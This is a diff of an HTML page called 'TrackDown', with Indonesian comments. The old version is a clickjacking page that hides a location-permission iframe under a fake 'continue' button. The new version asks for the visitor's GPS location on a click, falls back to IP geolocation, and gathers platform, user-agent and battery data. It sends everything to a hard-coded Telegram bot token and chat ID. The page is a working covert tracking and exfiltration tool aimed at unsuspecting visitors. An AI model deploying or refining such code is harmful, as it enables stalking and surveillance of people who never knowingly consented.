@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TrackDown Clickjacking</title>
+    <title>TrackDown Enhanced</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,41 +11,35 @@
             margin-top: 50px;
         }
 
-        /* Tombol Palsu yang menarik perhatian */
-        .fake-button {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #4CAF50;
+        .action-button {
+            background-color: #4CAF50;
             color: white;
             padding: 20px 40px;
             font-size: 20px;
             border: none;
+            border-radius: 5px;
             cursor: pointer;
-            z-index: 10;
+            margin-top: 20px;
         }
 
-        /* Iframe yang transparan untuk dialog izin lokasi */
-        iframe {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 300px;
-            height: 300px;
-            opacity: 0; /* Membuat iframe transparan */
-            z-index: 9;
+        #log {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #555;
+            white-space: pre-wrap;
         }
     </style>
 </head>
 <body>
-    <button class="fake-button">Klik untuk Melanjutkan</button>
-    <iframe src="https://yourdomain.com/location.html"></iframe>
+    <h1>Welcome to TrackDown!</h1>
+    <p>Click the button below to continue.</p>
+    <button class="action-button" id="getLocationButton">Klik untuk Melanjutkan</button>
+    <div id="log">Menunggu tindakan pengguna...</div>
 
     <script>
-        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww";
-        const chatId = "5649811717";
+        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww"; // Ganti dengan token bot Telegram Anda
+        const chatId = "5649811717"; // Ganti dengan Chat ID Anda
+        const logElement = document.getElementById("log");
 
         function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
@@ -54,48 +48,95 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: message }),
             })
-            .then(response => console.log("Data sent to Telegram"))
-            .catch(error => console.error("Error sending to Telegram:", error));
+            .then(response => {
+                if (response.ok) {
+                    logElement.textContent += "\nData berhasil dikirim ke Telegram.";
+                } else {
+                    logElement.textContent += "\nGagal mengirim data ke Telegram.";
+                }
+            })
+            .catch(error => logElement.textContent += "\nGagal mengirim data ke Telegram.");
         }
 
-        // Fungsi untuk mengambil lokasi berbasis IP
         function getIPLocation() {
+            logElement.textContent += "\nMengambil lokasi berbasis IP...";
             fetch("https://ipapi.co/json/")
                 .then(response => response.json())
                 .then(data => {
                     const ipLocationInfo = `
-                        IP Address: ${data.ip}
-                        City: ${data.city}
-                        Region: ${data.region}
-                        Country: ${data.country_name}
+IP Address: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
                     `;
+                    logElement.textContent += "\nLokasi berbasis IP berhasil diambil.";
                     sendToTelegram(`Fallback IP Location:\n${ipLocationInfo}`);
                 })
-                .catch(error => console.error("Error fetching IP location:", error));
+                .catch(error => logElement.textContent += "\nGagal mengambil lokasi berbasis IP.");
         }
 
-        // Inisialisasi Clickjacking
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-
-                    const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                    sendToTelegram(`Location Info:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nGoogle Maps: ${googleMapsUrl}`);
-                },
-                (error) => {
-                    // Jika gagal, gunakan lokasi berbasis IP
-                    sendToTelegram("Location Info: Could not retrieve location. Using fallback IP location.");
-                    getIPLocation();
-                }
-            );
-        } else {
-            // Jika Geolocation API tidak didukung, gunakan lokasi berbasis IP
-            sendToTelegram("Location Info: Geolocation not supported by browser. Using fallback IP location.");
-            getIPLocation();
+        function getDeviceInfo() {
+            const deviceInfo = `
+Platform: ${navigator.platform}
+User Agent: ${navigator.userAgent}
+Vendor: ${navigator.vendor || 'N/A'}
+            `;
+            logElement.textContent += "\nMengambil informasi perangkat...";
+            return deviceInfo;
         }
+
+        function getBatteryStatus(messageCallback) {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(function(battery) {
+                    const batteryInfo = `
+Battery Level: ${battery.level * 100}%
+Charging: ${battery.charging ? 'Yes' : 'No'}
+                    `;
+                    messageCallback(batteryInfo);
+                }).catch(function(error) {
+                    messageCallback("Battery Status: Gagal diambil.");
+                });
+            } else {
+                messageCallback("Battery Status: Tidak didukung.");
+            }
+        }
+
+        function sendDeviceAndLocationInfo(latitude, longitude, accuracy) {
+            let message = `Location Info:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}\n\n`;
+            message += `Device Info:\nPlatform: ${navigator.platform}\nUser Agent: ${navigator.userAgent}\nVendor: ${navigator.vendor || 'N/A'}\n`;
+
+            getBatteryStatus((batteryInfo) => {
+                message += `\n${batteryInfo}`;
+                sendToTelegram(message);
+            });
+        }
+
+        function getGeolocation() {
+            if (navigator.geolocation) {
+                logElement.textContent += "\nMengakses lokasi perangkat...";
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        logElement.textContent += "\nLokasi perangkat berhasil diambil.";
+                        sendDeviceAndLocationInfo(latitude, longitude, accuracy);
+                    },
+                    (error) => {
+                        logElement.textContent += "\nIzin lokasi ditolak atau gagal.";
+                        getIPLocation(); // Fallback ke lokasi berbasis IP
+                    }
+                );
+            } else {
+                logElement.textContent += "\nGeolocation tidak didukung oleh browser.";
+                getIPLocation(); // Fallback ke lokasi berbasis IP
+            }
+        }
+
+        // Event listener untuk tombol
+        document.getElementById("getLocationButton").addEventListener("click", () => {
+            getGeolocation();
+        });
     </script>
 </body>
 </html>
